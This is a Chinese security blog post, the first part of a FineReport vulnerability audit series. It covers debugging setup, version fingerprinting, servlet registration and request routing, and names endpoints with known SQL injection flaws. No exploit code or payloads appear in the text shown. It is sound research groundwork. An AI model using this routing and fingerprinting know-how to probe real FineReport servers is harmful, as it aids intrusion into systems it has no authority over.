@@ -1,0 +1,1213 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Web, Security, Web安全, Java, Java安全">
+    <meta name="description" content="记录一下我的网安学习">
+    <meta name="author" content="1diot9">
+    
+    <title>
+        
+            帆软FineReport历史漏洞分析（一） |
+        
+        1diot9&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+        <link rel="shortcut icon" href="/images/baka.png">
+    
+    
+<link rel="stylesheet" href="/font/css/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/regular.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/solid.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/brands.min.css">
+
+    
+    <script class="keep-theme-configurations">
+    const KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"zh-CN","path":"search.json"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#CCCCCC","title":"1diot9's Blog","author":"1diot9","avatar":"/images/baka.png","logo":"/images/baka.png","favicon":"/images/baka.png"},"menu":{"home":"/","archives":"/archives","tags":"/tags","categories":"/categories","about":"/about"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","background_img_dark":"/images/bg.svg","description":"登上山顶的人沉默不语，半途而废者诉说着旅途的艰辛","hitokoto":false},"social_contact":{"enable":true,"links":{"github":"https://www.github.com/1diot9","weixin":"img | /images/weixin.jpg","qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":true,"percent":false,"hide_header":true},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"updated","post_datetime_format":"YYYY-MM-DD HH:mm:ss"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":false,"reward":{"enable":false,"img_link":null,"text":null,"icon":null},"img_align":"center"},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"default"},"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":true},"comment":{"enable":false,"use":"valine","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.39"},"waline":{"server_url":null,"reaction":false,"version":"3.3.2"},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":false},"cdn":{"enable":false,"provider":"cdnjs"},"pjax":{"enable":true},"footer":{"since":2025,"word_count":true,"site_deploy":{"enable":true,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{},"version":"4.2.5"}
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
+    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
+    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
+  </script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <i class="pjax-progress-icon fas fa-circle-notch fa-spin"></i>
+    
+</div>
+
+
+
+<main class="page-container border-box">
+    <!-- home first screen  -->
+    
+
+    <!-- page content -->
+    <div class="page-main-content border-box">
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="border-box header-content">
+        <div class="left flex-start border-box">
+            
+                <a class="logo-image border-box" href="/">
+                    <img src="/images/baka.png">
+                </a>
+            
+            <a class="site-name border-box" href="/">
+               1diot9&#39;s Blog
+            </a>
+        </div>
+
+        <div class="right border-box">
+            <div class="pc border-box">
+                <ul class="menu-list border-box">
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/">
+                                
+                                首页
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/archives">
+                                
+                                归档
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/tags">
+                                
+                                标签
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/categories">
+                                
+                                分类
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/about">
+                                
+                                关于
+                                
+                            </a>
+                            
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="menu-text-color fas search fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile border-box flex-start">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list border-box">
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/">
+                            
+                            首页
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/archives">
+                            
+                            归档
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/tags">
+                            
+                            标签
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/categories">
+                            
+                            分类
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/about">
+                            
+                            关于
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle border-box">
+
+            <div class="main-content border-box">
+                
+
+                    
+<div class="fade-in-down-animation">
+    <div class="post-page-container border-box">
+        <div class="post-content-container border-box">
+            
+
+            <div class="post-content-bottom border-box">
+                
+                    <div class="post-title">
+                        帆软FineReport历史漏洞分析（一）
+                    </div>
+                
+
+                
+                    <div class="post-header border-box">
+                        
+                            <div class="avatar-box border-box">
+                                <img src="/images/baka.png">
+                            </div>
+                        
+                        <div class="info-box">
+                            <div class="author border-box">
+                                <span class="name">1diot9</span>
+                                
+                                    <span class="author-badge">Lv5</span>
+                                
+                            </div>
+                            <div class="meta-info border-box">
+                                
+
+<div class="post-meta-info-container border-box post">
+    <div class="post-meta-info border-box">
+        
+
+        
+            <span class="meta-info-item post-create-date">
+                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
+                <span class="datetime">2026-03-15 19:17:50</span>
+            </span>
+
+            
+                <span class="meta-info-item post-update-date">
+                    <i class="icon fa-solid fa-file-pen"></i>&nbsp;
+                    <span class="datetime" data-updated="Wed Mar 18 2026 16:49:25 GMT+0800">2026-03-18 16:49:25</span>
+                </span>
+            
+        
+
+        
+            <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
+                <ul class="post-category-ul">
+                    
+                            <li class="category-item"><a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+            <span class="post-tag meta-info-item border-box">
+                <ul class="post-tag-ul">
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/Java%E5%AE%89%E5%85%A8/">Java安全</a></li>
+                        
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+        
+            <span class="meta-info-item post-wordcount">
+                <i class="icon fas fa-file-word"></i>&nbsp;<span>8.3k 字</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-min2read">
+                <i class="icon fas fa-clock"></i>&nbsp;<span>37 分钟</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-pv">
+                <i class="icon fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+            </span>
+        
+    </div>
+
+    
+</div>
+
+                            </div>
+                        </div>
+                    </div>
+                
+
+                <div class="post-content keep-markdown-body ">
+                    
+
+                    
+                         <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本文首发于先知社区：<a class="link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/news/91753" >https://xz.aliyun.com/news/91753<i class="fas fa-external-link-alt"></i></a></p>
+<p>关于帆软报表的历史漏洞，网上文章比较散乱，本人在分析时也遇到了许多困难。</p>
+<p>所以乘此机会，对帆软的历史漏洞做一个梳理，尽可能详细分析每一个漏洞，希望给想要审计的师傅一些帮助。</p>
+<p>本文的目标是：</p>
+<p>1、介绍帆软报表的项目结构，如何调试</p>
+<p>2、分析路由注册逻辑</p>
+<p>3、分析 &#x2F;print&#x2F;ie&#x2F;pdf SQL注入漏洞</p>
+<p>4、分析 &#x2F;view&#x2F;ReportServer SQL注入漏洞</p>
+<p>5、分析 export&#x2F;excel SQL注入漏洞</p>
+<p>相关代码：<a class="link"   target="_blank" rel="noopener" href="https://github.com/1diot9/MyJavaSecStudy/tree/main/CodeAudit/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8FineReport" >https://github.com/1diot9/MyJavaSecStudy/tree/main/CodeAudit/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8FineReport<i class="fas fa-external-link-alt"></i></a></p>
+<h1 id="项目结构简析"><a href="#项目结构简析" class="headerlink" title="项目结构简析"></a>项目结构简析</h1><p>通过官网可下载最新版本：<a class="link"   target="_blank" rel="noopener" href="https://www.finereport.com/product/download?_sasdk=fMzYxOTU3OA" >https://www.finereport.com/product/download?_sasdk=fMzYxOTU3OA<i class="fas fa-external-link-alt"></i></a></p>
+<p>补丁下载：<a class="link"   target="_blank" rel="noopener" href="https://help.fanruan.com/finereport/doc-view-4658.html" >https://help.fanruan.com/finereport/doc-view-4658.html<i class="fas fa-external-link-alt"></i></a></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773555982426-2c53e938-c1a5-434d-84c9-b3f258895b42.png"  alt="img"></p>
+<p>这里我选取了11.0.28-2024.7.23和11.5.4.1-2025.10.20两个版本</p>
+<p>这两个版本的jar可以到我的仓库：<a class="link"   target="_blank" rel="noopener" href="https://github.com/1diot9/MyJavaSecStudy/tree/main/CodeAudit/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8FineReport/jars" >https://github.com/1diot9/MyJavaSecStudy/tree/main/CodeAudit/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8FineReport/jars<i class="fas fa-external-link-alt"></i></a></p>
+<p>先看日志：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1772776653600-35d9a602-1bd5-45af-a5f7-2e202667e785.png"  alt="img"></p>
+<p>再看其他：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773555694532-66eb8990-005e-4629-9f44-614b7b3233a7.png"  alt="img"></p>
+<p>bin：启动exe</p>
+<p>jre：版本8u191</p>
+<p>lib：设计器相关jar   版本更新会更新这个</p>
+<p>plugins：插件</p>
+<p>server：tomcat相关依赖</p>
+<p>webapps&#x2F;webroot&#x2F;WEB-INF&#x2F;lib：服务器相关jar，这个最关键，不同版本的漏洞就看这些</p>
+<p>这里其实可以直接让Claude code分析。想让AI分析源码的话，把lib用jadx反编译得到源码即可。</p>
+<h1 id="调试教程"><a href="#调试教程" class="headerlink" title="调试教程"></a>调试教程</h1><h2 id="远程调试"><a href="#远程调试" class="headerlink" title="远程调试"></a>远程调试</h2><p>bin&#x2F;designer.vmoptions添加参数：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773556048117-e434a9f4-a38e-402f-862d-e37fe23fcbf6.png"  alt="img"></p>
+<p>使用<a class="link"   target="_blank" rel="noopener" href="https://github.com/cwkiller/ClassLinefix" >https://github.com/cwkiller/ClassLinefix<i class="fas fa-external-link-alt"></i></a> 为WEB-INF下的jar添加行号信息，方便调试。</p>
+<p>把服务器的jar和tomcat的jar都添加到库：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773556198929-8cda7748-7311-4ea6-92e1-3d1eb17e01ea.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773556205068-e392092c-e1b5-47cb-bbc9-c64269465f89.png"  alt="img"></p>
+<p>给com.fr.third.springframework.web.servlet.DispatcherServlet#doDispatch加断点，然后访问：<a class="link"   target="_blank" rel="noopener" href="http://localhost:8075/webroot/decision/system/info" >http://localhost:8075/webroot/decision/system/info<i class="fas fa-external-link-alt"></i></a></p>
+<p>能断住就可以。</p>
+<h1 id="版本区分"><a href="#版本区分" class="headerlink" title="版本区分"></a>版本区分</h1><p>1、访问<a class="link"   target="_blank" rel="noopener" href="http://localhost:8075/webroot/decision/system/info" >http://localhost:8075/webroot/decision/system/info<i class="fas fa-external-link-alt"></i></a></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773556402609-2439ba33-5d10-4896-9095-b0347899c077.png"  alt="img"></p>
+<p>2、访问<a class="link"   target="_blank" rel="noopener" href="http://localhost:8075/webroot/decision/login%EF%BC%8C%E6%9F%A5%E7%9C%8B%E7%BD%91%E9%A1%B5%E6%BA%90%E4%BB%A3%E7%A0%81" >http://localhost:8075/webroot/decision/login，查看网页源代码<i class="fas fa-external-link-alt"></i></a></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773556437460-4960c112-73a1-4e77-a15a-b58182e49130.png"  alt="img"></p>
+<p>历史版本文档：</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://help.fanruan.com/finereport/doc-view-4658.html" >https://help.fanruan.com/finereport/doc-view-4658.html<i class="fas fa-external-link-alt"></i></a></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773559432891-0d35231e-ed0b-45d5-8a80-5bccf05f736f.png"  alt="img"></p>
+<h1 id="Servlet注册逻辑"><a href="#Servlet注册逻辑" class="headerlink" title="Servlet注册逻辑"></a>Servlet注册逻辑</h1><p>在分析漏洞时，经常涉及ReportServlet.java，于是想知道这个类是如何注册成为servlet，这样说不定能够完整知道项目中的所有路由。于是结合AI，开启Servlet注册逻辑的分析。</p>
+<p>这里以ReportServer这个Servlet为例，讲一讲帆软是如何进行Servlet注册的。</p>
+<h2 id="servlet注册"><a href="#servlet注册" class="headerlink" title="servlet注册"></a>servlet注册</h2><p>com.fr.report.ReportActivator#start：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773123494112-0c05a00e-6230-4195-98d3-8a646c5b1db7.png"  alt="img"></p>
+<p>跟进com.fr.report.ReportActivator#initReportServlet：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773123621969-40942800-2b19-4e69-954d-d7b5b856ac70.png"  alt="img"></p>
+<p>箭头所指的部分，使用了ServletContext原生的方法进行了注册。</p>
+<p>同时需要看看ServerConfig获取到的Name和Mapping：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773123667762-47d72eb2-5e63-47c3-a918-357004db2f57.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773123678413-6dc6a7da-deb8-4542-b248-2b830b44f398.png"  alt="img"></p>
+<p>这下就清楚了，这个Servlet的名字是ReportServer，对应的路由为&#x2F;ReportServer&#x2F;* 。</p>
+<h2 id="activator注册"><a href="#activator注册" class="headerlink" title="activator注册"></a>activator注册</h2><p>不过现在有个问题，帆软启动的时候，是怎么确保调用一开始Activator的start方法，对每一个Servlet进行注册呢？</p>
+<h3 id="配置文件加载模块"><a href="#配置文件加载模块" class="headerlink" title="配置文件加载模块"></a>配置文件加载模块</h3><p>来看com.fr.startup.FineWebApplicationInitializer#onStartup：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773126637117-b3bbee0e-83ed-47ff-b171-30963ec09ed7.png"  alt="img"></p>
+<p>这个类实现了WebApplicationInitializer，会在Web容器启动时自动回调onStartup方法。跟进start：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773126709758-2633816c-67be-4442-9319-7ec1dd3ef20a.png"  alt="img"></p>
+<p>一开始肯定还不是运行状态，所以会进入下面的executeStart，实际进入的是com.fr.startup.FineWebApplicationStartup#executeStart：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773126805001-597ba5db-1785-409a-bcd1-ddfcf065ac87.png"  alt="img"></p>
+<p>这里会获取要加载的服务模块，然后调用start，先看看是怎么加载模块的，跟进到com.fr.startup.FineWebApplicationStartup#getServerModule：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773126854760-488a69a3-6936-4479-befe-b72e28632f68.png"  alt="img"></p>
+<p>这里会进入if，跟进parseRoot：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773128013490-cb4e5374-64a4-43e2-9239-2a07d77abd8d.png"  alt="img"></p>
+<p>这里我们就知道了，配置文件位于com&#x2F;fr&#x2F;config&#x2F;starter&#x2F;server-startup.xml。继续跟进parse，再跟进两次build，来到com.fr.module.engine.build.ModuleBuilder#build(com.fr.module.engine.build.config.ModuleConfig, com.fr.module.Module)：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773128258822-89a69d8d-87ea-4c4e-a68b-70a1ee9c9520.png"  alt="img"></p>
+<p>这里会获取配置文件中的activator属性，并通过createActivator方法，使用反射来获取activator实例：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773128359513-60364238-8d86-4dfd-993f-c8ec627cf094.png"  alt="img"></p>
+<p>而最后的buildChildren则会递归调用build，从而将activator都加载进去。然后返回FineModule。</p>
+<p>现在来看一下配置文件：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773128392336-e028b4e4-08b3-468c-a6f3-7a2ba2930049.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773128542562-6e08934d-3e23-469e-8f23-17f5b5427f85.png"  alt="img"></p>
+<p>能够看到，这里是有ReportActivator的。</p>
+<h3 id="start初始化"><a href="#start初始化" class="headerlink" title="start初始化"></a>start初始化</h3><p>回到com.fr.startup.FineWebApplicationStartup#executeStart：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773128892724-cefa7e45-d9a7-4b61-8559-d42db51ea269.png"  alt="img"></p>
+<p>现在跟进start，这里需要跟进多个start，最后来到com.fr.module.engine.FineModule.FineModuleRunner#executeStart：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773129175390-666c2342-d9c8-466f-b955-e723e83392af.png"  alt="img"></p>
+<p>这里最终会调用到com.fr.module.engine.strategy.AbstractInvokeSubStrategy#start：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773129467145-821b0dc6-6de5-4a33-b80e-80031c206e1c.png"  alt="img"></p>
+<p>构造方法中的默认值是parent-first：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773131424777-677d7c99-e972-42b1-bf12-a59090fe2a5a.png"  alt="img"></p>
+<p>这里的doStart会调用到com.fr.module.engine.strategy.ParentFirstStrategy#doStart：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773131302994-f4c67cc0-4183-4a47-8fb8-90ddd6f3ae1c.png"  alt="img"></p>
+<p>最终调用activator.start。</p>
+<p>至此，servlet的注册流程分析完毕。所以，我们能够知道，配置文件中，activator属性中的类，在项目启动时，都会调用start方法。如果里面有注册servlet的逻辑，则会在应用启动时注册。</p>
+<p>总结一下：</p>
+<ol>
+<li>Tomcat 启动 → 扫描 WebApplicationInitializer 实现</li>
+<li>Spring 初始化 → FineWebApplicationInitializer.onStartup()</li>
+<li>模块框架启动 → FineWebApplicationStartup.start()</li>
+<li>解析配置文件 → ModuleContext.parseRoot(“server-startup.xml”)</li>
+<li>构建模块树 → ModuleBuilder.build() 通过反射创建 ReportActivator 实例</li>
+<li>启动模块 → FineModule.start() → ParentFirstStrategy.doStart()</li>
+<li>调用 Activator → ReportActivator.start() → initReportServlet()</li>
+</ol>
+<h1 id="路由分析"><a href="#路由分析" class="headerlink" title="路由分析"></a>路由分析</h1><h2 id="Servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h2><p>紧接着上面的servlet分析。</p>
+<p>上面我们知道了，一个servlet是怎么在帆软中注册的。但还是不知道所有的mapping映射关系。</p>
+<p>其实想获取这个很简单。</p>
+<p>只需要找一个有HttpServletRequest参数的方法，一般可以是doGet，doPost，handle，然后运行一下表达式，即可获取：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773394300222-2a737bb8-ff45-4b02-9812-e3eb4a8f4dd6.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773394311203-7360457b-10f3-4a59-ad32-d0b985f2a316.png"  alt="img"></p>
+<p>表达式：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// 获取当前项目的根目录</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;user.dir&quot;</span>) + java.io.File.separator + <span class="string">&quot;servlet_mappings.txt&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建文件输出流 (使用 UTF-8 编码防止中文乱码)</span></span><br><span class="line">    java.io.<span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.PrintWriter(<span class="keyword">new</span> <span class="title class_">java</span>.io.OutputStreamWriter(<span class="keyword">new</span> <span class="title class_">java</span>.io.FileOutputStream(path), <span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 遍历并写入文件，使用反射避开 Servlet 包依赖报错</span></span><br><span class="line">    <span class="keyword">for</span> (Object reg : var1.getServletContext().getServletRegistrations().values()) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">mappings</span> <span class="operator">=</span> reg.getClass().getMethod(<span class="string">&quot;getMappings&quot;</span>).invoke(reg);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">className</span> <span class="operator">=</span> reg.getClass().getMethod(<span class="string">&quot;getClassName&quot;</span>).invoke(reg);</span><br><span class="line">            out.println(<span class="string">&quot;映射路径: &quot;</span> + mappings + <span class="string">&quot; ===&gt; 类名: &quot;</span> + className);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception innerEx) &#123;</span><br><span class="line">            out.println(<span class="string">&quot;解析某一项失败: &quot;</span> + innerEx.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    out.flush();</span><br><span class="line">    out.close();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在求值结果框里返回文件路径，方便你找到它</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;写入成功！请在项目目录查看文件：&quot;</span> + path;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;写入失败：&quot;</span> + e.getMessage();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Dispatcher"><a href="#Dispatcher" class="headerlink" title="Dispatcher"></a>Dispatcher</h2><p>在看export&#x2F;excel SQL注入这个漏洞时，发现poc有两种url。</p>
+<p>&#x2F;webroot&#x2F;decision&#x2F;view&#x2F;report 和</p>
+<p>&#x2F;webroot&#x2F;ReportServer</p>
+<p>这两个路由最终都会进入com.fr.web.core.ReportDispatcher#dealWithRequest。</p>
+<p>现在来分析一下为什么，最后给出所有controller路由的映射。这里不涉及漏洞原理，只对路由进行分析。</p>
+<h3 id="webroot-ReportServer"><a href="#webroot-ReportServer" class="headerlink" title="&#x2F;webroot&#x2F;ReportServer"></a>&#x2F;webroot&#x2F;ReportServer</h3><p>首先看第二个url，这个我们在servlet注册逻辑中分析过。访问&#x2F;ReportServer&#x2F;*时，都会转到ReportServlet处理：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773130778427-534bac77-03ac-4c3b-9841-0beaf8cba610.png"  alt="img"></p>
+<p>由于ReportServlet只有service方法，所以最后会调用其父类BaseServlet进行处理，最终进入dealWithRequest：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773130944930-4ef2ea86-ae05-4a08-b0e4-2b5fd9553f42.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773130993225-73d02f61-3a33-4570-95b5-8949f77eee62.png"  alt="img"></p>
+<h3 id="webroot-decision-view-report"><a href="#webroot-decision-view-report" class="headerlink" title="&#x2F;webroot&#x2F;decision&#x2F;view&#x2F;report"></a>&#x2F;webroot&#x2F;decision&#x2F;view&#x2F;report</h3><p>看到com.fr.decision.base.DecisionServletInitializer#start：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773132050359-8062d6da-4d8f-475a-a36a-d1a7c0505278.png"  alt="img"></p>
+<p>这也是个activator，所以能在配置文件里找到，代表应用启动时会调用其start方法：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773132080484-0df3997b-1fcd-44cd-a048-cdfdf7ae4f07.png"  alt="img"></p>
+<p>跟进箭头所指的代码，即startServlet：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773132139956-eb0f5701-6f94-4d2a-abb2-ec0d98562fae.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773132149403-c5e59937-a1cb-4897-8f7e-7e7d85d59fb7.png"  alt="img"></p>
+<p>能够看到，这里把spring的DispatcherServlet映射到&#x2F;decision。那么&#x2F;decision&#x2F;* 中 * 的内容，应该就由DispatcherServlet处理，那就跟spring boot的处理逻辑一样了，就是先过interceptor，然后分发到对应controller。这里也解释了，为什么后面很多漏洞路由都是 &#x2F;decision 开头</p>
+<p>而为什么能转到对应controller，很简单，写在注解里了：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773133230956-e3683bf8-4395-4406-b4b4-3f733a707a59.png"  alt="img"></p>
+<p>这里会一路handle，最后进入dealWithRequest：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773133966354-b91c707a-2a49-4823-97ae-e6611fc10fb5.png"  alt="img"></p>
+<p>到这里，就能够知道为什么两种路由最后会触发同一个漏洞了，因为最后调用的方法是一样的，都是com.fr.web.core.ReportDispatcher#dealWithRequest</p>
+<p>可以在com.fr.third.springframework.web.servlet.DispatcherServlet#getHandler取出所有的映射关系：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773133560696-00ef7f78-7f78-4e9d-b4b4-392d35aba0bf.png"  alt="img"></p>
